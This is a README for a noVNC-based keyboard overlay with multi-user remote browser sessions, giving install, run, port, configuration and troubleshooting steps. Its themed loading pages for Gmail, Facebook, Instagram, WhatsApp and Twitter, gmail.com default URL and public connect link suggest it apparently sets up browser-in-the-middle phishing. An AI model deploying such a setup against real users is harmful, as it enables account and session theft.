
# noVNC Keyboard System

Mobile-friendly keyboard overlay for noVNC with multi-user session support.

## Features

- 📱 **Mobile Keyboard** - iOS-style keyboard that auto-shows on text field focus
- 👥 **Multi-User** - Up to 10 concurrent users with isolated sessions
- 🎨 **Themed Loading** - Custom loading pages for Gmail, Facebook, Instagram, WhatsApp, Twitter
- 🔄 **Auto-Assign** - Sessions automatically assigned by IP address
- ⏱️ **Session Timeout** - Auto-cleanup after 10 minutes of inactivity
- 🖥️ **Admin Panel** - Web-based session management

## Quick Start

### 1. Install

```bash
cd ~/novnc-keyboard
chmod +x install.sh
./install.sh
```

### 2. Run

**Interactive Mode:**
```bash
cd ~/novnc-keyboard/ubuntu-agent
python3 launcher.py
```

**Direct Start:**
```bash
python3 start_server.py --url "https://gmail.com" --vnc "vnc_lite.html"
```

**As Service:**
```bash
sudo systemctl start novnc-keyboard
```

### 3. Access

- **Admin Panel:** `http://your-ip:6080/admin`
- **User Connect:** `http://your-ip:6080/connect`

## Ports Needed

Open these ports:

| Port Range | Purpose |
|------------|---------|
| 6080 | Admin panel |
| 6081-6090 | noVNC sessions |
| 6101-6110 | Keyboard agents |

## File Structure

```
novnc-keyboard/
├── install.sh              # Quick install script
├── ubuntu-agent/
│   ├── launcher.py         # Interactive CLI
│   ├── start_server.py     # Direct server start
│   ├── admin_panel.py      # Web admin & session router
│   ├── session_manager.py  # Multi-user session handling
│   ├── agent.py            # Keyboard WebSocket agent
│   ├── focus_detector.py   # Text field detection
│   └── novnc-keyboard.service  # Systemd service
└── keyboard-overlay/
    └── keyboard.html       # Standalone keyboard (legacy)
```

## Configuration

### Change Default URL

1. Edit service file:
```bash
sudo nano /etc/systemd/system/novnc-keyboard.service
```

2. Change `--url` parameter

3. Reload:
```bash
sudo systemctl daemon-reload
sudo systemctl restart novnc-keyboard
```

### Session Settings

Edit `session_manager.py`:

- `MAX_CONCURRENT_SESSIONS = 10` - Max users
- `SESSION_TIMEOUT_MINUTES = 10` - Auto-close timeout

## Troubleshooting

### Session not loading

```bash
# Check logs
tail -50 ~/.config/novnc-keyboard/session_manager.log

# Check if services running
ps aux | grep -E "(vnc|websockify|chrome)"
```

### Keyboard not showing

1. Check AWS security group has port 6101-6110 open
2. Check agent is running:
```bash
tail -20 ~/.config/novnc-keyboard/agent.log
```

### Clear all sessions

```bash
pkill -f websockify
pkill chrome
vncserver -kill :1
rm ~/.config/novnc-keyboard/sessions.json
```

## License

MIT












